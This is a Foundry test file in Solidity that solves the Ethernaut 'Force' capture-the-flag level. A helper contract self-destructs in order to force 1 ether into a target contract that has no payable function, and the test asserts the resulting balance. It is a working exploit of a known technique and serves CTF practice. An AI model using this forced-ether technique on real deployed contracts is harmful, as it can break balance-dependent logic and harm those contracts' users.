// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Force.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract Helper {
  constructor(address _target) payable {
    selfdestruct(payable(_target));
  }
}

contract ForceExploit is Test {
  Force target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Force();
    console.log('Target contract deployed');
    vm.deal(exploiter, 10 ether);
    vm.stopPrank();
  }

  function testExploit() public {
    uint256 balance = address(target).balance;
    console.log('Target contract balance: %d', balance);
    assertEq(balance, 0 ether);

    vm.startPrank(exploiter);
    new Helper{value: 1 ether}(address(target));
    vm.stopPrank();

    balance = address(target).balance;
    console.log('Target contract balance: %d', balance);
    assertEq(balance, 1 ether);
  }
}
